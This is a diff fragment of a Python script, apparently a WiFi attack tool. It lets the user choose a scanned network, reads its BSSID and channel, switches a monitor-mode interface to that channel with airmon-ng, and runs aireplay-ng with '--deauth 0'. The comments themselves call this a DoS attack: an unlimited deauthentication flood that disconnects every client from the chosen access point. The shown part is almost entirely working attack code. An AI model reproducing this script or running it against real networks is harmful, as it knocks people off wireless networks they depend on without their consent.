@@ -152,3 +152,33 @@ try:
         # the script sleeps for 1 second before loading the updated list
         time.sleep(1)
 
+except KeyboardInterrupt:
+    print("\nReady to make choice:")
+
+#check that the input choice is valid
+while True:
+    # If you don't make a choice from the options in the list, 
+    # you're asked to try again.
+    choice = input("Please select a choice from above: ")
+    try:
+        if active_wifi_networks[int(choice)]:
+            break
+    except:
+        print("Please try again.")
+
+# assign the results to variables.
+hackbssid = active_wifi_networks[int(choice)]["BSSID"]
+hackchannel = active_wifi_networks[int(choice)]["channel"].strip()
+
+# Change to the channel we're going to run the DOS attack on 
+# the monitoring takes place on a different channel. set it to that channel. 
+subprocess.run(["airmon-ng", "start", user_choice + "mon", hackchannel])
+
+# deauthenticates clients using a subprocess.
+# This script is the parent process and it creates a child process which runs the system command, 
+# and will only continue once the child process has completed
+
+subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
+
+
+# press CTRL-C to exit the script
